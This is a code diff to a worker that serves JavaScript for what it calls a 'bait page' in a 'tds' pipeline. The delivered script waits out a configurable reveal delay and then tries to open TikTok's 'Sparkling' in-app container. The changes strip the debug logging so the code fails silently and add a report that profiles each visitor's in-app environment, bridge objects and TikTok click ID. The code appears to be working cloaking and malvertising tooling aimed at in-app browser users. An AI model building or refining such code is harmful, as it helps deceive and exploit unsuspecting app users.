@@ -12,36 +12,56 @@
 
 import { corsHeaders, handleOptions } from '../../shared/cors.mjs';
 
-function buildDeliveredScript(env) {
+function buildDeliveredScript(env, sessionRef) {
   const delayMs = Number(env.REVEAL_DELAY_MS || 60000);
+  const safeRef = String(sessionRef || '').replace(/[^a-zA-Z0-9_\-]/g, '');
 
   return `
-// TODO: for a tighter perceived wait, start this clock earlier — e.g. in the
-// bait page's orchestrator (bait-page/public/index.html) right after
-// requestEntryBootstrap() — rather than only once this lane's script runs.
-const __tdsClock = new Promise((resolve) => setTimeout(resolve, ${delayMs}));
+const __tdsClock = new Promise(function(resolve) { setTimeout(resolve, ${delayMs}); });
 
 function initializeSparklingContainer() {
-  if (typeof classify !== 'function') {
-    console.log('[tds] classify() not loaded — did lane-3-classify run first?');
-    return false;
-  }
+  if (window.__tdsAbort) return false;
+  if (typeof classify !== 'function') return false;
   return classify();
 }
 
 function openSparklingContainer(state) {
-  if (typeof openContainer !== 'function') {
-    console.log('[tds] openContainer() not loaded — did lane-4-container run first?');
-    return;
-  }
+  if (typeof openContainer !== 'function') return;
   openContainer(state);
 }
 
+function __tdsReport(opened, validated, aborted) {
+  try {
+    fetch('/report', {
+      method: 'POST',
+      credentials: 'same-origin',
+      cache: 'no-store',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sessionRef: '${safeRef}',
+        state: {
+          opened: opened,
+          validated: validated,
+          aborted: aborted,
+          hasSparkling: !!(window.Sparkling || window.TikTokSparkling),
+          hasBridge: !!(window.webkit && window.webkit.messageHandlers),
+          inTikTokApp: /TikTok/i.test(navigator.userAgent),
+          ttclid: typeof ttclid !== 'undefined' ? !!ttclid : false,
+        },
+      }),
+    });
+  } catch(e) {}
+}
+
 (async function finish() {
-  const state = initializeSparklingContainer();
-  if (!state) return; // silent bail — matches the original's behavior
+  var _aborted  = !!window.__tdsAbort;
+  var _validated = !_aborted;
+  if (_aborted) { __tdsReport('none', false, true); return; }
+  var state = initializeSparklingContainer();
+  if (!state) { __tdsReport('none', _validated, false); return; }
   await __tdsClock;
   openSparklingContainer(state);
+  __tdsReport('attempted', _validated, false);
 })();
 `.trim();
 }
@@ -60,7 +80,7 @@ export default {
       doubles: [Date.now()],
     });
 
-    const code = buildDeliveredScript(env);
+    const code = buildDeliveredScript(env, body._sessionRef || '');
     return new Response(code, {
       status: 200,
       headers: { ...corsHeaders(request, allowedOrigin), 'Content-Type': 'application/javascript' },
